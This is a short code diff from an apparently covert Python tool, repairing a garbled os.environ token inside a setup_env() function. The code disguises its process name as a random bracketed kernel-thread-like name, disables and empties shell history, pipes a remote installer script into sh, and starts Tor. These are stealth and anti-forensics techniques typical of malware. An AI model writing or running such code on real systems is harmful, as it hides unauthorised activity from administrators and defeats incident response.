@@ -620,14 +620,14 @@ def setup_env():
         ctypes.CDLL("libc.so.6").prctl(15, f"[{rand_str(3)}]", 0, 0, 0)
     except:
         pass
-    os***REMOVED***iron["HISTFILE"] = "/dev/null"
-    os***REMOVED***iron["HISTSIZE"] = "0"
-    os***REMOVED***iron["HISTFILESIZE"] = "0"
+    os.environ["HISTFILE"] = "/dev/null"
+    os.environ["HISTSIZE"] = "0"
+    os.environ["HISTFILESIZE"] = "0"
     try:
         subprocess.run(["cargo", "--version"], capture_output=True, check=True)
     except:
         subprocess.run("curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y", shell=True)
-        os***REMOVED***iron["PATH"] += ":" + os.path.expanduser("~/.cargo/bin")
+        os.environ["PATH"] += ":" + os.path.expanduser("~/.cargo/bin")
     setup_tor()
     return True
 
